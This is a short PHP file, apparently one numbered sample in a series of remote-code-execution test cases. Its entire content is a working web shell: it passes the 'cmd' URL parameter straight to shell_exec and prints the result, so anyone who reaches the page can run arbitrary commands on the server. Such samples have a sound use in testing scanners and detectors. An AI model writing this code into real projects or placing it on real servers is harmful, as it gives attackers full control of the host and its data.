<?php
// RCE test variation #257
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>